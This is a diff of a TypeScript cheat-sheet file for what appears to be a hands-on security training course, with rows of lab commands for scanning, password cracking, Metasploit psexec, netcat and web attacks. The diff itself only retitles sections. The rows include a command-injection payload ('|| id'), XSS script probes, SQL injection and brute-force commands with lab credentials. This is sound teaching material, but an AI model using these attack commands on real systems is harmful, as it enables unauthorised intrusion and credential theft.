@@ -19,7 +19,7 @@ function r(command: string, purpose: string, flags: string, lab: string): CheatR
  */
 const SECTIONS: CheatSection[] = [
   {
-    name: "Lab 1.1 — PowerShell Live Investigation",
+    name: "Lab 1.1: PowerShell Live Investigation",
     rows: [
       r("Get-Process lsass | Select-Object -Property *", "Dump every property of a known-good process", "Select -Property *: full object; learn the shape before filtering", "Lab 1.1"),
       r("Get-Process | Select Path,Name,Id | Where-Object -Property Path -Like \"*temp*\"", "Find processes running out of TEMP", "Where -Like \"*temp*\": case-insensitive wildcard on Path", "Lab 1.1"),
@@ -31,7 +31,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 1.2 — Network Beacon Detection with RITA",
+    name: "Lab 1.2: Network Beacon Detection with RITA",
     rows: [
       r("./rita.sh import -l log/ ~/labs/falsimentis/", "Import Zeek logs into RITA", "-l log/: write import log; last arg is the Zeek log dir", "Lab 1.2"),
       r("./rita.sh view falsimentis", "Open the RITA UI; read the Beacon score column", "High beacon score = regular C2 callback interval", "Lab 1.2"),
@@ -43,7 +43,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 1.3 — Malware Analysis (AnalyticsInstaller.exe)",
+    name: "Lab 1.3: Malware Analysis (AnalyticsInstaller.exe)",
     rows: [
       r("Get-FileHash -Algorithm SHA256 .\\AnalyticsInstaller.exe", "Hash the sample for IOC lookup", "-Algorithm MD5 / SHA256; hash before detonating", "Lab 1.3"),
       r("C:\\tools\\Sysinternals\\strings.exe -n 10 .\\AnalyticsInstaller.exe", "Pull readable strings / IOCs", "-n 10: min length 10 to cut noise", "Lab 1.3"),
@@ -54,7 +54,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 1.4 — AI-Assisted Incident Handling",
+    name: "Lab 1.4: AI-Assisted Incident Handling",
     rows: [
       r("goaichat", "Start the local AI stack (Ollama chat)", "Offline model; no data leaves the lab host", "Lab 1.4"),
       r("cat ~/labs/falsimentis/analytics-backup.bat", "Load the obfuscated sample to deobfuscate", "Feed to the model for step-by-step decode", "Lab 1.4"),
@@ -63,7 +63,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 2.1 — Nmap Discovery & Enumeration",
+    name: "Lab 2.1: Nmap Discovery & Enumeration",
     rows: [
       r("nmap -n -sn 172.30.0.1-254   (then again with sudo)", "Host discovery; privileged sweep uses ARP", "sudo -sn finds hosts that ignore ICMP/TCP probes", "Lab 2.1"),
       r("sudo nmap -n -sT -p 1-65535 172.30.0.20", "Full-range TCP connect scan", "-sT connect scan; -p 1-65535 beats the default top-1000", "Lab 2.1"),
@@ -74,7 +74,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 2.2 — Cloud (masscan + TLS attribution)",
+    name: "Lab 2.2: Cloud (masscan + TLS attribution)",
     rows: [
       r("masscan -p 443 --rate 10000 -oL simcloud.txt 10.200.0.0/16", "Sweep a /16 cloud range fast", "--rate packets/sec; -oL list output; SYN stealth", "Lab 2.2"),
       r("awk '/open/ {print $4}' simcloud.txt > simcloud-targets.txt", "Extract just the live IPs", "$4 = IP in masscan -oL lines", "Lab 2.2"),
@@ -85,7 +85,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 2.3 — SMB Security",
+    name: "Lab 2.3: SMB Security",
     rows: [
       r("smbclient -L //172.30.0.22 -U tdoudney%Falsimentis123", "List shares (creds inline as user%pass)", "SMB1 workgroup listing failing is normal here", "Lab 2.3"),
       r("smbclient //172.30.0.22/IT -U tdoudney%Falsimentis123", "Connect to a share; ls / get files", "Found logon.cmd (drive maps) + netssh.cmd (proxy)", "Lab 2.3"),
@@ -95,7 +95,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 2.4 — Hayabusa (EVTX threat hunting)",
+    name: "Lab 2.4: Hayabusa (EVTX threat hunting)",
     rows: [
       r(".\\hayabusa.exe csv-timeline --directory C:\\Tools\\win10evtx\\ -o out.csv --no-color", "Build a Sigma-based detection timeline", "Scan wizard picks rule set; sysmon rules add coverage", "Lab 2.4"),
       r("(scan wizard) rule set 5 = all event+alert rules", "Load the full rule set", "209 deprecated / 45 unsupported / 12 noisy excluded", "Lab 2.4"),
@@ -105,7 +105,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 2.5 — Netcat",
+    name: "Lab 2.5: Netcat",
     rows: [
       r("nc -l -p 2222   ↔   nc 10.10.75.1 2222", "Listener / client chat", "-l listen, -p port; same syntax Linux + Windows", "Lab 2.5"),
       r("Get-Content .\\text.txt | nc -l -p 1234   ↔   nc 10.10.0.1 1234 > out.txt", "File transfer over nc", "Sender pipes in; receiver redirects to a file", "Lab 2.5"),
@@ -115,7 +115,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 3.1 — Legba (password attacks)",
+    name: "Lab 3.1: Legba (password attacks)",
     rows: [
       r("legba -C credentials.txt -T http://172.30.0.12/ http.basic", "Credential stuffing (combo list)", "-C combo user:pass; protocol is the last arg", "Lab 3.1"),
       r("legba -U root -P 10k-most-common.txt -T 172.30.0.64 mysql", "Single-user dictionary attack", "-U user, -P wordlist; found root:changeme", "Lab 3.1"),
@@ -124,7 +124,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 3.3 — Hashcat",
+    name: "Lab 3.3: Hashcat",
     rows: [
       r("hashcat slingshot.hashes --identify", "Identify candidate hash modes", "descrypt 1500 / md5crypt 500 / sha256/512crypt 7400/1800", "Lab 3.3"),
       r("hashcat -a 0 -m 1500 slingshot.hashes /usr/share/wordlists/passwords.txt", "Dictionary attack (-a 0)", "-m mode, -a 0 straight wordlist", "Lab 3.3"),
@@ -136,7 +136,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 3.4 — Metasploit",
+    name: "Lab 3.4: Metasploit",
     rows: [
       r("search type:exploit psexec", "Find modules by keyword/type", "type:exploit / platform:windows filters", "Lab 3.4"),
       r("use exploit/windows/smb/psexec ; info", "Select a module; read options + targets", "psexec = authenticated user code execution", "Lab 3.4"),
@@ -148,7 +148,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 4.1 — IDOR / Forced Browsing",
+    name: "Lab 4.1: IDOR / Forced Browsing",
     rows: [
       r("curl http://support.falsimentis.com/robots.txt", "Read robots.txt as a map of hidden paths", "Disallow entries point at /admin, /singlestatus", "Lab 4.1"),
       r("ffuf -w combined_words.txt -u http://host/FUZZ", "Directory / content discovery", "FUZZ marks the injection point; default status matcher", "Lab 4.1"),
@@ -158,7 +158,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 4.2 — Command Injection",
+    name: "Lab 4.2: Command Injection",
     rows: [
       r("?target=-h", "Argument injection probe (harmless)", "Prints fping usage → input reaches the command line", "Lab 4.2"),
       r("?target=-z || id", "Command injection via failure operator", "Invalid -z forces fping to fail; || runs id → uid=0(root)", "Lab 4.2"),
@@ -168,7 +168,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 4.3 — Cross-Site Scripting (Stored)",
+    name: "Lab 4.3: Cross-Site Scripting (Stored)",
     rows: [
       r("<field>Lorezo<hr>", "Probe each field with a harmless tag", "Rendered rule = injectable; literal text = escaped", "Lab 4.3"),
       r("email: lorenzo@gmail.com<script>alert(1)</script>", "Confirm script execution", "Test EVERY field; email was unescaped, name was not", "Lab 4.3"),
@@ -178,7 +178,7 @@ const SECTIONS: CheatSection[] = [
     ],
   },
   {
-    name: "Lab 4.4 — SQL Injection",
+    name: "Lab 4.4: SQL Injection",
     rows: [
       r("?search=RAG'", "Manual confirmation probe", "Single quote → MariaDB 1064 syntax error", "Lab 4.4"),
       r("sqlmap -u \"http://host/kb?entityid=3487&search=RAG\"", "Automated detection", "Tests both params; only 'search' is injectable", "Lab 4.4"),
